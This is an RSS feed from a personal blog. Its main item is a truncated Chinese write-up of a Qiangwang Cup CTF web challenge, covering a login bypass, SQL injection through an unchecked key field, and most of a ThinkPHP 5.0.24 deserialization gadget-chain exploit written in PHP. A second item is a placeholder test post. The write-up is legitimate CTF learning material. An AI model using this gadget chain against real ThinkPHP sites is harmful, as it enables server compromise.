<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on xlccccc&#39;s blog</title>
    <link>https://blog.xlccccc.top/posts/</link>
    <description>Recent content in Posts on xlccccc&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>© Athul</copyright>
    <lastBuildDate>Wed, 20 Dec 2023 12:28:18 +0800</lastBuildDate>
    <atom:link href="https://blog.xlccccc.top/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>强网杯s7部分题解</title>
      <link>https://blog.xlccccc.top/posts/%E5%BC%BA%E7%BD%91%E6%9D%AFs7%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <pubDate>Wed, 20 Dec 2023 12:28:18 +0800</pubDate>
      <guid>https://blog.xlccccc.top/posts/%E5%BC%BA%E7%BD%91%E6%9D%AFs7%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <description>thinkshop 主要就是php的代码审计&#xA;因为给的是容器导出的文件，所以一上来就看了下mysql的db，发现有一个admin/123456的用户，结果登陆不上，然后把mysql日志打开看下登陆的时候执行了什么语句&#xA;set GLOBAL general_log=&amp;#39;ON&amp;#39;; 发现为select * from admin where id =&#xA;所以登陆的时候输入1/123456即可&#xA;再审一下代码会发现数据库内存的是序列化后的数据，渲染在html的时候会反序列化，结合题目所在的thinkphp，不难想到此时需要找一个sql注入更改数据库内的序列化数据&#xA;而执行sql语句的地方就几个点&#xA;这里在edit的时候没有控制key，而add的时候控制了key，那么很显然就是key这里能注入了，然后找个thinkphp5.0.24的链子套一层array生成然后注入就好了&#xA;&amp;lt;?php namespace think\process\pipes { class Windows { private $files = []; public function __construct($files) { $this-&amp;gt;files = [$files]; //$file =&amp;gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-&amp;gt;parent = $output; //$this-&amp;gt;parent=&amp;gt; think\console\Output; $this-&amp;gt;append = array(&amp;#34;xxx&amp;#34;=&amp;gt;&amp;#34;getError&amp;#34;); //调用getError 返回this-&amp;gt;error $this-&amp;gt;error = $modelRelation; // $this-&amp;gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&amp;gt;&amp;gt;HasOne } } } namespace think\model{ use think\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\model\relation{ class HasOne extends OneToOne { } } namespace think\model\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-&amp;gt;selfRelation = 0; $this-&amp;gt;query = $query; //$query指向Query $this-&amp;gt;bindAttr = [&amp;#39;xxx&amp;#39;];// $value值，作为call函数引用的第二变量 } } } namespace think\db { class Query { protected $model; function __construct($model) { $this-&amp;gt;model = $model; //$this-&amp;gt;model=&amp;gt; think\console\Output; } } } namespace think\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-&amp;gt;styles = [&amp;#39;getAttr&amp;#39;]; $this-&amp;gt;handle =$handle; //$handle-&amp;gt;think\session\driver\Memcached } } } namespace think\session\driver { class Memcached { protected $handler; function __construct($handle) { $this-&amp;gt;handler = $handle; //$handle-&amp;gt;think\cache\driver\File } } } namespace think\cache\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-&amp;gt;options=[ &amp;#39;expire&amp;#39; =&amp;gt; 3600, &amp;#39;cache_subdir&amp;#39; =&amp;gt; false, &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;path&amp;#39; =&amp;gt; &amp;#39;php://filter/convert.</description>
    </item>
    <item>
      <title>Blog Test</title>
      <link>https://blog.xlccccc.top/posts/blog-test/</link>
      <pubDate>Thu, 14 Dec 2023 20:09:20 +0800</pubDate>
      <guid>https://blog.xlccccc.top/posts/blog-test/</guid>
      <description>test test&#xA;test&#xA;print(&amp;#34;test&amp;#34;) </description>
    </item>
  </channel>
</rss>
